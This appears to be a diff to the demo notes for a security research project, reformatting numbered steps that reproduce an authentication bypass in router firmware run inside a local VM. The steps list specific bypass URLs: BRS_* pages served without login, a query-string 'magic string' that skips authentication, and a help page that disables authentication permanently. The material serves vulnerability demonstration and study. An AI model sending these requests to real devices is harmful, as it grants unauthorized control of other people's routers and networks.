@@ -4,30 +4,33 @@
                       | |_| | |___| |  | | |_| |
                       |____/|_____|_|  |_|\___/
 
-Launch the VM
-    run-vm -i overlays/0.qcow2
+Follow these steps to demonstrate the exploit in a working VM.
+For instructions describing VM setup see the NOTES file.
 
-Setup the VM
-    less setup.sh
+1. Launch the VM
+       run-vm -i overlays/0.qcow2 -P 8888
 
-Show that authentication is turned off
-    chroot squashfs-root/ /bin/config get hijack_process
+2. Setup the VM
+       less setup.sh
 
-Show the main page
-    http://localhost:8888/index.htm
+3. Show that authentication is turned off
+       chroot squashfs-root/ /bin/config get hijack_process
 
-Turn on authentication
-    chroot squashfs-root/ /bin/config set hijack_process="3"
-    chroot squashfs-root/ /bin/config get hijack_process
+4. Show the main page
+       http://localhost:8888/index.htm
 
-Refresh the main page
+5. Turn on authentication
+       chroot squashfs-root/ /bin/config set hijack_process="3"
+       chroot squashfs-root/ /bin/config get hijack_process
 
-Show that BRS_* pages bypass authentication
-    http://localhost:8888/BRS_success.html
+6. Refresh the main page
 
-Show that pages w/magic string bypass authentication
-    http://localhost:8888/thank_login.htm?foo=unauth.cgi
+7. Show that BRS_* pages bypass authentication
+       http://localhost:8888/BRS_success.html
 
-Show that an unprotected page removes all authentication forever
-    http://localhost:8888/BRS_02_genieHelp.html
-    chroot squashfs-root/ /bin/config get hijack_process
+8. Show that pages w/magic string bypass authentication
+       http://localhost:8888/thank_login.htm?foo=unauth.cgi
+
+9. Show that an unprotected page disables authentication forever
+       http://localhost:8888/BRS_02_genieHelp.html
+       chroot squashfs-root/ /bin/config get hijack_process
